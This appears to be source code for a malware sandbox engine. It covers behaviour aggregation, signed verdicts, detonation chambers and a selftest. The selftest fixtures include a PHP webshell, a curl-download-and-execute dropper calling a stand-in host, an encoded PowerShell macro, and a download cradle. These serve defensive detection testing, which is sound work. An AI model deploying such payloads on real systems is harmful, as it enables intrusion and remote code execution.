    for what, label in (("mutex", "Mutex"), ("pipe", "Pipe"),
                        ("service_name", "ServiceName")):
        for v in tr.values("capability", what) + tr.values("process", what):
            emit(v, label)

    # 5) only if nothing dynamic was available, fall back to the static
    #    indicator that convicted the sample. Weakest of the five, and marked
    #    medium severity so an operator can tell it apart from a live artefact.
    # 5) a distinctive construct from the sample's own source, with the
    #    argument that followed it. Better than the bare indicator by a wide
    #    margin, and the only static signature worth installing.
    if not res.signatures:
        for cand in sorted(tr.values("meta", "sig_candidate"),
                           key=len, reverse=True)[:6]:
            emit(cand, "Construct", severity="medium")

    # 6) last resort: the bare indicator that convicted the sample.
    if not res.signatures:
        for obs in tr.observations:
            # source must be CONTENT. An import-table symbol name is not a
            # usable inline pattern -- a rule matching "CreateRemoteThread"
            # fires on the import directory of every benign binary that calls
            # it, which is a self-inflicted outage, not a detection.
            if (obs.kind == "capability" and obs.value and obs.source == SRC_CONTENT
                    and len(obs.value) >= 10
                    and TOKEN_WEIGHT.get(obs.what, 0) >= 45):
                emit(obs.value, "Indicator", severity="medium")


# Thresholds for aggregate behaviour. A single file write means nothing; the
# COUNT is the signal, which is why these facts cannot be emitted by the code
# that records individual events.
# Selftest fixtures. Defined here rather than inline because a Windows path
# literal has to survive being written by a patch script, and this file has
# already been corrupted once by backslash mangling.
WIN_STARTUP_PATH = ("C:" + chr(92) + "Users" + chr(92) + "u" + chr(92)
                    + "AppData" + chr(92) + "Roaming" + chr(92)
                    + "Microsoft" + chr(92) + "Windows" + chr(92)
                    + "Start Menu" + chr(92) + "Programs" + chr(92)
                    + "Startup" + chr(92) + "x.exe")
WIN_RUNKEY_PATH = ("HKCU" + chr(92) + "Software" + chr(92) + "Microsoft"
                   + chr(92) + "Windows" + chr(92) + "CurrentVersion"
                   + chr(92) + "Run" + chr(92) + "Updater")

MASS_WRITE_FILES = 25
# How many ransom-suffixed files make a pattern rather than an artefact.
RANSOM_SPREAD_FILES = 3
MASS_DELETE_FILES = 15
BEACON_MIN_REQUESTS = 3


def derive_aggregates(tr: BehaviorTrace) -> None:
    """Emit observations that only exist in the totals."""
    writes = set(tr.values("file", "write")) | {d.get("name", "")
                                                for d in tr.dropped}
    writes.discard("")
    if len(writes) >= MASS_WRITE_FILES:
        tr.add("crypto", "mass_rewrite",
               "wrote %d distinct files in one run" % len(writes), live=True,
               value=str(len(writes)))
    # Several ransom-suffixed files in one run is the pattern; one is an
    # artefact. The Ransomware rule reads this, not the per-file token.
    marked = set(tr.values("crypto", "ransom_extension"))
    if len(marked) >= RANSOM_SPREAD_FILES:
        tr.add("crypto", "ransom_spread",
               "wrote %d files with ransom-associated suffixes" % len(marked),
               live=True, value=str(len(marked)))
    deletes = set(tr.values("file", "delete"))
    if len(deletes) >= MASS_DELETE_FILES:
        tr.add("crypto", "mass_delete",
               "deleted %d distinct files in one run" % len(deletes),
               live=True, value=str(len(deletes)))
    # Repeated contact with the same host is a beacon, not a one-off fetch.
    hosts: Dict[str, int] = {}
    for o in tr.observations:
        if o.kind == "net" and o.what in ("http_request", "dns_query",
                                          "tls_sni") and o.live and o.value:
            hosts[o.value] = hosts.get(o.value, 0) + 1
    for host, n in hosts.items():
        if n >= BEACON_MIN_REQUESTS:
            tr.add("net", "repeated_contact",
                   "contacted %s %d times" % (host, n), live=True, value=host)


# ===========================================================================
# Verdict signing
# ===========================================================================
# Default key locations for VerdictSigner. They live here, with the class, and
# ffn_crucible_node imports them: the class referenced these names while they
# were defined only in the node module, so constructing a signer with default
# arguments raised NameError. Defaults name FILES; no key material is ever in
# this tree (see tools/PUBLISH-POLICY).
SEED_PATH = os.environ.get("FFN_CRUCIBLE_SEED",
                           "/etc/ffn-ngfw/crucible-verdict.key")
PUB_PATH = os.environ.get("FFN_CRUCIBLE_PUB",
                          "/etc/ffn-ngfw/crucible-verdict.pub")


class VerdictSigner:
    """ed25519 over a canonical verdict serialisation.

    The canonical form is deliberately NOT the whole report. It is exactly the
    fields the firewall acts on -- hash, verdict, score, threat name, generated
    signatures, IOCs -- so that adding a diagnostic field to the report later
    cannot invalidate signatures, and so that a verifier can tell precisely
    what it is trusting. Everything outside the canonical form is advisory.
    """

    # Bump if the canonical field set ever changes, so an old verifier refuses
    # a new bundle rather than checking a signature over fields it cannot see.
    VERSION = 1

    def __init__(self, seed_path: str = None, pub_path: str = None):
        self.seed_path = seed_path or SEED_PATH
        self.pub_path = pub_path or PUB_PATH
        self._seed: Optional[bytes] = None
        self._pub: Optional[bytes] = None

    # -- key material ------------------------------------------------------
    @staticmethod
    def _load_hex(path: str, want: int) -> Optional[bytes]:
        try:
            with open(path) as fh:
                raw = fh.read().strip()
        except OSError:
            return None
        try:
            val = bytes.fromhex(raw)
        except ValueError:
            logger.warning("%s is not hex key material", path)
            return None
        if len(val) != want:
            logger.warning("%s is %d bytes, expected %d", path, len(val), want)
            return None
        return val

    def seed(self) -> Optional[bytes]:
        if self._seed is None:
            self._seed = self._load_hex(self.seed_path, 32)
        return self._seed

    def pub(self) -> Optional[bytes]:
        if self._pub is None:
            self._pub = self._load_hex(self.pub_path, 32)
            if self._pub is None and self.seed() and ffn_ed25519 is not None:
                self._pub = ffn_ed25519.publickey(self.seed())
        return self._pub

    def can_sign(self) -> bool:
        return ffn_ed25519 is not None and self.seed() is not None

    def key_id(self) -> str:
        p = self.pub()
        return p.hex()[:16] if p else ""

    # -- the canonical form ------------------------------------------------
    @classmethod
    def canonical(cls, bundle: dict) -> bytes:
        """Byte-exact serialisation both sides must agree on."""
        core = {
            "v": cls.VERSION,
            "sha256": str(bundle.get("sha256", "")),
            "verdict": str(bundle.get("verdict", "unknown")),
            "score": int(bundle.get("score", 0) or 0),
            "threat": str(bundle.get("threat", "")),
            "file_type": str(bundle.get("file_type") or ""),
            "analyzed": str(bundle.get("analyzed", "")),
            "node": str(bundle.get("node", "")),
            "signatures": sorted(
                [{"name": str(s.get("name", "")),
                  "pattern_hex": str(s.get("pattern_hex", "")),
                  "action": int(s.get("action", 0) or 0),
                  "severity": str(s.get("severity", ""))}
                 for s in bundle.get("signatures", [])],
                key=lambda d: (d["pattern_hex"], d["name"])),
            "iocs": sorted(
                [{"type": str(i.get("type", "")), "value": str(i.get("value", "")),
                  "verdict": str(i.get("verdict", "")),
                  "name": str(i.get("name", ""))}
                 for i in bundle.get("iocs", [])],
                key=lambda d: (d["type"], d["value"])),
        }
        return json.dumps(core, sort_keys=True, separators=(",", ":")).encode("utf-8")

    def sign(self, bundle: dict) -> dict:
        """Return the bundle with sig/key_id/sig_alg attached."""
        out = dict(bundle)
        if not self.can_sign():
            out["sig"] = ""
            out["sig_alg"] = "none"
            out["key_id"] = ""
            return out
        msg = self.canonical(bundle)
        out["sig"] = ffn_ed25519.sign(msg, self.seed(), self.pub()).hex()
        out["sig_alg"] = "ed25519"
        out["key_id"] = self.key_id()
        return out

    @staticmethod
    def verify(bundle: dict, pub: bytes) -> bool:
        """Check a bundle against a known public key. Any doubt is a refusal."""
        if ffn_ed25519 is None or not pub:
            return False
        # An hmac or 'none' algorithm must never be accepted where ed25519 is
        # expected: that downgrade is the whole attack.
        if bundle.get("sig_alg") != "ed25519":
            return False
        sig_hex = bundle.get("sig") or ""
        try:
            sig = bytes.fromhex(sig_hex)
        except ValueError:
            return False
        if len(sig) != 64:
            return False
        return ffn_ed25519.verify(VerdictSigner.canonical(bundle), sig, pub)


# ===========================================================================
# The engine
# ===========================================================================
# What the box is allowed to do, least to most invasive. The default is static:
# an appliance must not start executing carved traffic because someone deployed
# an update -- enabling a live chamber is an operator decision.
POLICY_STATIC = "static"      # dissect only, never execute
POLICY_JAIL = "jail"          # + namespaced native execution on this box
POLICY_VM = "vm"              # + guest-VM detonation
POLICY_BEST = "best"          # highest-fidelity chamber that is available
POLICIES = (POLICY_STATIC, POLICY_JAIL, POLICY_VM, POLICY_BEST)


@dataclass
class _Report:
    """Local stand-in for cloud_det.SandboxReport when that is not deployed.

    Field-for-field identical on purpose: a report produced here must be
    interchangeable with one produced by any other backend, so the service
    consuming it cannot tell which module built it.
    """
    sha256: str
    verdict: str = "unknown"
    score: int = 0
    threat_name: str = ""
    file_type: Optional[str] = None
    signatures: List = field(default_factory=list)
    iocs: List[Tuple[str, str, str, str]] = field(default_factory=list)
    details: Dict = field(default_factory=dict)
    backend: str = "crucible"
    analyzed: float = 0.0

    def to_json(self) -> str:
        return json.dumps({
            "sha256": self.sha256, "verdict": self.verdict, "score": self.score,
            "threat_name": self.threat_name, "file_type": self.file_type,
            "signatures": [{"name": s.name, "pattern_hex": s.pattern.hex(),
                            "action": s.action, "severity": s.severity}
                           for s in self.signatures],
            "iocs": [{"type": t, "value": v, "verdict": vd, "name": nm}
                     for (t, v, vd, nm) in self.iocs],
            "details": self.details, "backend": self.backend,
        }, sort_keys=True)


def _report_class():
    """cloud_det.SandboxReport if available, else the local stand-in.

    Imported lazily and never at module scope: cloud_det imports THIS module,
    so a module-level import here would be a cycle.
    """
    try:
        from cloud_det import SandboxReport
        return SandboxReport
    except Exception:
        return _Report


class CrucibleSandbox:
    """Detonation engine with a CloudBackend-compatible analyze()."""

    name = "crucible"

    def __init__(self, *, policy: str = POLICY_STATIC,
                 timeout: int = DEFAULT_TIMEOUT,
                 chambers: Optional[List[Chamber]] = None,
                 guest_profiles: str = DEFAULT_GUEST_PROFILES,
                 workdir: Optional[str] = None,
                 report_cls=None):
        if policy not in POLICIES:
            raise ValueError("policy must be one of %s" % (POLICIES,))
        self.policy = policy
        self.timeout = timeout
        self.workdir = workdir
        self.report_cls = report_cls or _report_class()
        if chambers is not None:
            self.chambers = list(chambers)
        else:
            self.chambers = [StaticChamber()]
            if policy in (POLICY_JAIL, POLICY_BEST):
                self.chambers.append(JailChamber(workdir=workdir))
            if policy in (POLICY_VM, POLICY_BEST):
                self.chambers.append(QemuChamber(profile_path=guest_profiles,
                                                 workdir=workdir))
        self.stats = {"analyzed": 0, "executed": 0, "malware": 0, "grayware": 0,
                      "benign": 0, "unknown": 0, "errors": 0}

    # -- introspection -----------------------------------------------------
    def statuses(self) -> List[ChamberStatus]:
        return [c.status() for c in self.chambers]

    def best_live_chamber(self, ftype: Optional[str],
                          data: bytes) -> Optional[Chamber]:
        """Highest-fidelity executing chamber that is available AND applicable."""
        best = None
        for c in self.chambers:
            if not c.executes:
                continue
            if not c.handles(ftype, data):
                continue
            if not c.status().available:
                continue
            if best is None or c.fidelity > best.fidelity:
                best = c
        return best

    # -- the analysis ------------------------------------------------------
    def detonate(self, sha256: str, data: bytes,
                 meta: Optional[dict] = None) -> BehaviorTrace:
        """Static pass, then the best available live chamber. Returns the trace.

        Static ALWAYS runs, even when a live chamber is available: format facts
        (packer, overlay, import table) are things execution does not reveal,
        and a sample that refuses to run still has to be judged on something.
        """
        meta = dict(meta or {})
        data = data[:MAX_SAMPLE]
        trace = StaticChamber().run(sha256, data, meta, timeout=self.timeout)

        if self.policy != POLICY_STATIC:
            live = self.best_live_chamber(trace.file_type, data)
            if live is not None:
                try:
                    trace.merge(live.run(sha256, data, meta, timeout=self.timeout))
                except Exception as e:               # a chamber fault is not a verdict
                    logger.exception("chamber %s failed on %s", live.name, sha256[:12])
                    trace.errors.append("%s: %s" % (live.name, e))
                    trace.add("error", "chamber_failed", str(e)[:200])
            else:
                why = "; ".join(
                    "%s: %s" % (c.name, c.status().reason)
                    for c in self.chambers if c.executes) or "no live chamber built"
                trace.add("meta", "no_live_chamber", why)
        derive_aggregates(trace)
        return trace

    def analyze(self, sha256: str, data: bytes, meta: dict):
        """CloudBackend interface: one sample in, one report out."""
        t0 = time.time()
        trace = self.detonate(sha256, data, meta)
        res = assay(trace)
        self.stats["analyzed"] += 1
        if trace.executed:
            self.stats["executed"] += 1
        self.stats[res.verdict] = self.stats.get(res.verdict, 0) + 1
        if trace.errors:
            self.stats["errors"] += 1

        rep = self.report_cls(
            sha256=sha256,
            verdict=res.verdict,
            score=res.score,
            threat_name=res.threat_name,
            file_type=trace.file_type,
            signatures=res.signatures,
            iocs=res.iocs,
            details={
                "chamber": trace.chamber,
                "fidelity": trace.fidelity,
                "executed": trace.executed,
                "conclusive": trace.conclusive(),
                "confidence": res.confidence,
                "size": trace.size,
                "duration": round(time.time() - t0, 3),
                "run_seconds": round(trace.duration, 3),
                "rules": [{"name": n, "weight": w, "live": live}
                          for (n, w, live, _why) in res.matched],
                "reasons": res.reasons[:24],
                "observations": [
                    {"kind": o.kind, "what": o.what, "value": o.value,
                     "live": o.live, "detail": o.detail[:200]}
                    for o in trace.observations[:200]],
                "dropped": trace.dropped[:32],
                "strings": trace.strings[:16],
                "errors": trace.errors[:8],
            },
            backend=self.name,
            analyzed=time.time())
        return rep

    def summary_stats(self) -> dict:
        s = dict(self.stats)
        s["policy"] = self.policy
        s["chambers"] = [c.name for c in self.chambers
                         if c.status().available]
        return s


# ===========================================================================
# Synthetic sample builders
#
# The selftest needs real PE and ELF files to prove the dissectors work, and
# committing malware to a git repository is not an option. These build valid,
# inert binaries with chosen import tables, so a test can assert "the engine
# saw CreateRemoteThread in the import directory" against a file whose bytes
# are fully accounted for. They are also handy for wiring up a new chamber.
# ===========================================================================
def build_test_pe(imports: Optional[Dict[str, List[str]]] = None, *,
                  pe32plus: bool = True, dll: bool = False,
                  packer_section: Optional[str] = None,
                  overlay: bytes = b"", body: bytes = b"") -> bytes:
    """Assemble a structurally valid, non-executing PE with a real import table."""
    imports = imports or {}
    opt_size = 240 if pe32plus else 224
    nsec = 2
    hdr_end = 0x80 + 4 + 20 + opt_size + nsec * 40
    size_of_headers = (hdr_end + 0x1FF) & ~0x1FF

    text_rva, text_off, text_sz = 0x1000, size_of_headers, 0x200
    rdata_rva, rdata_off, rdata_sz = 0x2000, text_off + text_sz, 0x600

    # -- build the .rdata payload: descriptors, thunks, names --------------
    ndesc = len(imports) + 1
    desc_sz = ndesc * 20
    step = 8 if pe32plus else 4
    cursor = desc_sz
    thunk_blocks: List[Tuple[str, int, List[str]]] = []
    for dllname, funcs in imports.items():
        thunk_blocks.append((dllname, cursor, list(funcs)))
        cursor += (len(funcs) + 1) * step
    names_at = cursor
    name_off: Dict[str, int] = {}
    blob = bytearray()
    for dllname, _t, funcs in thunk_blocks:
        for fn in funcs:
            name_off[fn] = names_at + len(blob)
            blob += struct.pack("<H", 0) + fn.encode("ascii") + b"\x00"
            if len(blob) % 2:
                blob += b"\x00"
        name_off[dllname] = names_at + len(blob)
        blob += dllname.encode("ascii") + b"\x00"

    rdata = bytearray(b"\x00" * rdata_sz)
    for i, (dllname, thunk_at, funcs) in enumerate(thunk_blocks):
        struct.pack_into("<IIIII", rdata, i * 20,
                         rdata_rva + thunk_at, 0, 0,
                         rdata_rva + name_off[dllname], rdata_rva + thunk_at)
        for j, fn in enumerate(funcs):
            val = rdata_rva + name_off[fn]
            if pe32plus:
                struct.pack_into("<Q", rdata, thunk_at + j * step, val)
            else:
                struct.pack_into("<I", rdata, thunk_at + j * step, val)
    rdata[names_at:names_at + len(blob)] = blob

    # -- headers -----------------------------------------------------------
    out = bytearray(b"\x00" * size_of_headers)
    out[0:2] = b"MZ"
    struct.pack_into("<I", out, 0x3C, 0x80)
    o = 0x80
    out[o:o + 4] = b"PE\x00\x00"
    machine = 0x8664 if pe32plus else 0x014C
    chars = 0x2022 if dll else 0x0022
    struct.pack_into("<HHIIIHH", out, o + 4, machine, nsec, 0, 0, 0,
                     opt_size, chars)
    opt = o + 24
    struct.pack_into("<H", out, opt, 0x20B if pe32plus else 0x10B)
    struct.pack_into("<I", out, opt + 16, text_rva)              # entry point
    struct.pack_into("<H", out, opt + 68, 2 if dll else 3)       # subsystem
    struct.pack_into("<H", out, opt + 70, 0x0140)                # ASLR + DEP
    struct.pack_into("<I", out, opt + (108 if pe32plus else 92), 16)
    dd = opt + (112 if pe32plus else 96)
    if imports:
        struct.pack_into("<II", out, dd + 8, rdata_rva, desc_sz)  # import dir

    sec = opt + opt_size
    text_name = (packer_section or ".text").encode("ascii")[:8]
    struct.pack_into("<8sIIIIIIHHI", out, sec,
                     text_name.ljust(8, b"\x00"), text_sz, text_rva,
                     text_sz, text_off, 0, 0, 0, 0, 0x60000020)
    struct.pack_into("<8sIIIIIIHHI", out, sec + 40,
                     b".rdata\x00\x00", rdata_sz, rdata_rva,
                     rdata_sz, rdata_off, 0, 0, 0, 0, 0x40000040)

    text = bytearray(b"\xC3" * text_sz)                          # ret, harmless
    if body:
        text[0:min(len(body), text_sz)] = body[:text_sz]
    return bytes(out) + bytes(text) + bytes(rdata) + overlay


def build_test_elf(symbols: Optional[List[str]] = None, *, big: bool = False,
                   is64: bool = True, machine: int = 62, rwx: bool = False,
                   interp: bool = True) -> bytes:
    """Assemble a structurally valid, non-executing ELF with chosen dynsyms.

    `big` builds a big-endian image on purpose: FFN's own data plane is
    big-endian MIPS64, so a sample carved there can be a BE ELF and a dissector
    that assumed LE would report every field as garbage.
    """
    symbols = symbols or []
    end = ">" if big else "<"
    ehsize = 64 if is64 else 52
    phentsize = 56 if is64 else 32
    shentsize = 64 if is64 else 40
    phnum = 2 if interp else 1

    dynstr = b"\x00" + b"\x00".join(sym.encode("ascii") for sym in symbols) + b"\x00"
    shstrtab = b"\x00.dynstr\x00.shstrtab\x00.text\x00"
    off_dynstr = ehsize + phnum * phentsize
    off_shstrtab = off_dynstr + len(dynstr)
    off_text = off_shstrtab + len(shstrtab)
    text = b"\x00" * 64
    off_sh = off_text + len(text)
    shnum = 4

    out = bytearray()
    out += b"\x7fELF" + bytes([2 if is64 else 1, 2 if big else 1, 1, 0])
    out += b"\x00" * 8
    out += struct.pack(end + "HH", 2, machine)
    out += struct.pack(end + "I", 1)
    if is64:
        out += struct.pack(end + "QQQ", 0x401000, ehsize, off_sh)
    else:
        out += struct.pack(end + "III", 0x8048000, ehsize, off_sh)
    out += struct.pack(end + "I", 0)
    out += struct.pack(end + "HHHHHH", ehsize, phentsize, phnum,
                       shentsize, shnum, 3)

    ph = bytearray()
    flags = 0x7 if rwx else 0x5
    if is64:
        ph += struct.pack(end + "IIQQQQQQ", 1, flags, 0, 0x400000, 0x400000,
                          off_sh, off_sh, 0x1000)
        if interp:
            ph += struct.pack(end + "IIQQQQQQ", 3, 4, off_dynstr, 0, 0,
                              len(dynstr), len(dynstr), 1)
    else:
        ph += struct.pack(end + "IIIIIIII", 1, 0, 0x8048000, 0x8048000,
                          off_sh, off_sh, flags, 0x1000)
        if interp:
            ph += struct.pack(end + "IIIIIIII", 3, off_dynstr, 0, 0,
                              len(dynstr), len(dynstr), 4, 1)
    assert len(ph) == phnum * phentsize, (len(ph), phnum * phentsize)

    def sh(name_off, sh_type, offset, size, entsize=0):
        if is64:
            return struct.pack(end + "IIQQQQIIQQ", name_off, sh_type, 0, 0,
                               offset, size, 0, 0, 1, entsize)
        return struct.pack(end + "IIIIIIIIII", name_off, sh_type, 0, 0,
                           offset, size, 0, 0, 1, entsize)

    sections = (sh(0, 0, 0, 0)
                + sh(shstrtab.index(b".dynstr"), 3, off_dynstr, len(dynstr))
                + sh(shstrtab.index(b".text"), 1, off_text, len(text))
                + sh(shstrtab.index(b".shstrtab"), 3, off_shstrtab, len(shstrtab)))
    body = bytes(out) + bytes(ph) + dynstr + shstrtab + text + sections
    return body


# ===========================================================================
# Self-test -- hermetic: nothing is executed, nothing leaves loopback.
# ===========================================================================
def _mkdocx(vba: bytes = b"", extra: Optional[Dict[str, bytes]] = None) -> bytes:
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        if vba:
            z.writestr("word/vbaProject.bin", vba)
        for name, body in (extra or {}).items():
            z.writestr(name, body)
    return buf.getvalue()


def _assay_of(data: bytes) -> Tuple[BehaviorTrace, AssayResult]:
    tr = BehaviorTrace(sha256=hashlib.sha256(data).hexdigest())
    dissect(data, tr)
    derive_aggregates(tr)
    return tr, assay(tr)


def selftest() -> int:
    failures = []

    def check(cond, msg):
        if cond:
            print("  [ok] %s" % msg)
        else:
            print("  [FAIL] %s" % msg)
            failures.append(msg)

    print("ffn_crucible selftest")

    # -- 1. PE dissection --------------------------------------------------
    print("\n1. PE dissection")
    pe = build_test_pe({"kernel32.dll": ["CreateRemoteThread", "VirtualAllocEx",
                                         "WriteProcessMemory", "LoadLibraryA"],
                        "wininet.dll": ["InternetOpenUrlA"]})
    tr, res = _assay_of(pe)
    caps = {o.what for o in tr.observations if o.kind == "capability"}
    check("proc_inject" in caps and "proc_alloc" in caps,
          "import directory walked: %s" % sorted(caps))
    check(tr.file_type == "pe", "file type is pe")
    check(all(o.source == SRC_IMPORT for o in tr.observations
              if o.kind == "capability"),
          "import-derived capabilities are marked as weak evidence")
    check(not any(o.what in ("static_domain", "static_ip")
                  for o in tr.observations),
          "no bare-hostname sweep over a binary (DLL names are not domains)")

    # -- 2. the static-only conviction guard -------------------------------
    print("\n2. static evidence must not convict on its own")
    check(res.verdict == "grayware" and res.score < SCORE_MALWARE,
          "an injector known only from its imports is %s/%d, not malware"
          % (res.verdict, res.score))
    check(res.confidence == "low", "confidence is low without execution")
    check(not res.signatures,
          "no inline signature generated from import symbol names")
    clean = build_test_pe({"kernel32.dll": ["ExitProcess", "GetStdHandle"]})
    _tr, cres = _assay_of(clean)
    check(cres.verdict == "unknown",
          "a quiet executable is 'unknown' from static alone, never 'benign'")
    _tr, tres = _assay_of(b"Maintenance window is the third Tuesday.\n" * 40)
    check(tres.verdict == "benign", "plain text is benign")

    # -- 3. malformed and hostile input ------------------------------------
    print("\n3. malformed input is evidence, not an exception")
    for label, blob in (("truncated PE", pe[:64]),
                        ("PE with bogus e_lfanew", b"MZ" + b"\x00" * 58 +
                         struct.pack("<I", 0x7FFFFFFF) + b"\x00" * 64),
                        ("truncated ELF", build_test_elf(["ptrace"])[:20]),
                        ("random bytes", bytes(range(256)) * 8),
                        ("empty", b""),
                        ("zip that is not", b"PK\x03\x04" + b"\xff" * 200),
                        ("pdf header only", b"%PDF-"),
                        ("ole header only", b"\xd0\xcf\x11\xe0")):
        try:
            _assay_of(blob)
            print("  [ok] %s handled" % label)
        except Exception as e:
            print("  [FAIL] %s raised %r" % (label, e))
            failures.append("%s raised" % label)

    # -- 4. document and script formats ------------------------------------
    print("\n4. documents and scripts")
    docx = _mkdocx(b"Attribute VB_Name\x00Sub AutoOpen()\r\n"
                   b"Shell(\"powershell -enc SQBFAFgA\")\r\nEnd Sub")
    _tr, r = _assay_of(docx)
    check(r.verdict == "malware" and r.threat_name == "MacroDropper",
          "auto-open macro that shells out -> %s/%s" % (r.verdict, r.threat_name))
    _tr, r = _assay_of(_mkdocx())
    check(r.verdict in ("benign", "unknown") and r.score < SCORE_GRAYWARE,
          "a macro-free document is not convicted (%s/%d)" % (r.verdict, r.score))

    tmpl = _mkdocx(extra={
        "word/_rels/settings.xml.rels":
            b'<Relationships><Relationship TargetMode="External" '
            b'Target="http://cdn-update.ru/t.dotm"/></Relationships>'})
    _tr, r = _assay_of(tmpl)
    check(r.threat_name == "RemoteTemplate",
          "external template target -> RemoteTemplate")
    check(any(t == "url" and "cdn-update.ru" in v and vd == "malware"
              for (t, v, vd, _n) in r.iocs),
          "the remote template URL is charged, not merely observed")

    _tr, r = _assay_of(b"%PDF-1.7\n1 0 obj<</OpenAction<</S/JavaScript"
                       b"/JS(x)>>>>endobj\n")
    check(r.verdict == "malware" and "Pdf" in r.threat_name,
          "PDF with an on-open script -> %s/%s" % (r.verdict, r.threat_name))

    _tr, r = _assay_of(b"<?php eval(base64_decode($_POST['c'])); ?>")
    check(r.verdict == "malware" and r.threat_name == "Webshell",
          "PHP webshell -> %s" % r.threat_name)
    check(any(b"eval(base64_decode" in sig.pattern for sig in r.signatures),
          "webshell signature is the distinctive source construct")

    _tr, r = _assay_of(b"#!/bin/sh\ncurl -s http://gate.cdn-update.ru/p -o /tmp/p\n"
                       b"chmod +x /tmp/p\n/tmp/p\n")
    check(r.verdict == "malware" and r.threat_name == "Downloader",
          "shell dropper -> %s (content evidence is not discounted)" % r.verdict)

    # -- 5. obfuscation unwrapping -----------------------------------------
    print("\n5. obfuscation")
    inner = build_test_pe({"kernel32.dll": ["CreateRemoteThread"]})
    wrapped = b"var p = '" + base64.b64encode(inner) + b"';\neval(p);\n"
    _tr, r = _assay_of(wrapped)
    check(r.verdict == "malware" and r.threat_name == "Encoded.Executable",
          "base64-wrapped executable is recovered -> %s" % r.threat_name)
    utf16 = "IEX (New-Object Net.WebClient).DownloadString('http://a.ru/x')" \
        .encode("utf-16-le")
    tr16 = BehaviorTrace(sha256="u")
    unwrap_layers(utf16, tr16)
    check(tr16.has("capability", "obfuscation"),
          "UTF-16LE encoded command body is decoded")

    _tr, r = _assay_of(b"X5O!P%@AP[4" + bytes([92]) + b"PZX54(P^)7CC)7}$"
                       b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    check(r.verdict == "malware" and r.threat_name == "EICAR.Test",
          "EICAR is identified from content, at full weight")

    # -- 6. the sinkhole ---------------------------------------------------
    print("\n6. sinkhole capture (loopback only)")
    sink = Sinkhole(sink_ip="10.99.99.99")
    ports = sink.start()
    if not all(k in ports for k in ("dns", "http", "tls")):
        check(False, "sinkhole could not bind (%s)" % ports)
    else:
        def qname(n):
            out = b""
            for lab in n.split("."):
                out += bytes([len(lab)]) + lab.encode()
            return out + b"\x00"

        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.settimeout(3)
        u.sendto(struct.pack(">HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0)
                 + qname("beacon.cdn-update.ru") + struct.pack(">HH", 1, 1),
                 ("127.0.0.1", ports["dns"]))
        answer, _ = u.recvfrom(2048)
        u.close()
        check(socket.inet_ntoa(answer[-4:]) == "10.99.99.99",
              "DNS query answered with the sink address")

        t = socket.create_connection(("127.0.0.1", ports["http"]), timeout=3)
        t.sendall(b"POST /gate/upload.php HTTP/1.1\r\n"
                  b"Host: beacon.cdn-update.ru\r\n"
                  b"User-Agent: Nyx/1.4\r\n\r\n")
        got = t.recv(64)
        t.close()
        check(got.startswith(b"HTTP/1.1 200"),
              "HTTP request answered 200 so a dropper proceeds")

        sni = b"panel.cdn-update.ru"
        ext = (b"\x00\x00" + struct.pack(">H", len(sni) + 5)
               + struct.pack(">H", len(sni) + 3) + b"\x00"
               + struct.pack(">H", len(sni)) + sni)
        hello_body = (b"\x03\x03" + b"\x41" * 32 + b"\x00"
                      + struct.pack(">H", 2) + b"\x13\x01" + b"\x01\x00"
                      + struct.pack(">H", len(ext)) + ext)
        hs = b"\x01" + struct.pack(">I", len(hello_body))[1:] + hello_body
        t2 = socket.create_connection(("127.0.0.1", ports["tls"]), timeout=3)
        t2.sendall(b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs)
        try:
            t2.recv(32)
        except OSError:
            pass
        t2.close()

        time.sleep(0.6)
        strace_tr = BehaviorTrace(sha256="s", chamber="test", fidelity=1)
        strace_tr.executed = True
        sink.into(strace_tr)
        sink.stop()
        check(strace_tr.has("net", "dns_query"), "DNS name captured")
        check("Nyx/1.4" in strace_tr.values("net", "http_ua"),
              "User-Agent captured")
        check("/gate/upload.php" in strace_tr.values("net", "http_uri"),
              "request path captured")
        check(sni.decode() in strace_tr.values("net", "tls_sni"),
              "TLS SNI captured")

        # live network evidence must produce charged IOCs and real signatures
        strace_tr.add("capability", "download", "observed fetch", live=True)
        strace_tr.add("capability", "exec", "observed exec", live=True)
        r = assay(strace_tr)
        check(r.verdict == "malware" and r.confidence == "high",
              "live evidence convicts at high confidence (%s/%s)"
              % (r.verdict, r.confidence))
        check(any(t == "domain" and v == "beacon.cdn-update.ru"
                  and vd == "malware" for (t, v, vd, _n) in r.iocs),
              "a resolved domain is charged with the sample's verdict")
        pats = [sig.pattern for sig in r.signatures]
        check(b"User-Agent: Nyx/1.4" in pats,
              "the odd User-Agent becomes a header-anchored content signature")
        check(any(b"/gate/upload.php" == p for p in pats),
              "the beacon URI becomes a content signature")

    # -- 7. trace parsers --------------------------------------------------
    print("\n7. trace parsers")
    tmp = tempfile.mkdtemp(prefix="crucible-test-")
    try:
        log = os.path.join(tmp, "trace.log")
        with open(log, "w") as fh:
            fh.write(
                'execve("/tmp/sample", ["sample"], 0x7ffd) = 0\n'
                'openat(AT_FDCWD, "/tmp/stage2", O_WRONLY|O_CREAT, 0755) = 3\n'
                'chmod("/tmp/stage2", 0755) = 0\n'
                'socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 4\n'
                'connect(4, {sa_family=AF_INET, sin_port=htons(4444), '
                'sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH\n'
                'openat(AT_FDCWD, "/etc/cron.d/update", O_WRONLY|O_CREAT, 0644) = 5\n'
                'mprotect(0x7f0000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) = 0\n'
                'ptrace(PTRACE_ATTACH, 1234) = 0\n'
                'clone(child_stack=NULL, flags=CLONE_VM) = 5678\n'
                'this line is not a syscall at all\n')
        ttr = BehaviorTrace(sha256="t", chamber="jail", fidelity=1)
        ttr.executed = True
        lines = parse_strace(log, ttr)
        check(lines == 10, "every trace line consumed (%d)" % lines)
        check("203.0.113.9:4444" in ttr.values("net", "connect"),
              "a FAILED connect still yields the C2 address")
        check(ttr.has("capability", "rwx"), "RWX mprotect seen")
        check(ttr.has("capability", "proc_inject"), "ptrace seen")
        check(ttr.has("persist", "persist_cron"),
              "a write under /etc/cron.d is named as persistence")
        check(ttr.has("file", "make_executable"), "chmod +x seen")
        check(ttr.has("process", "spawn"), "child process seen")
        check(all(o.source == SRC_RUNTIME for o in ttr.observations if o.live),
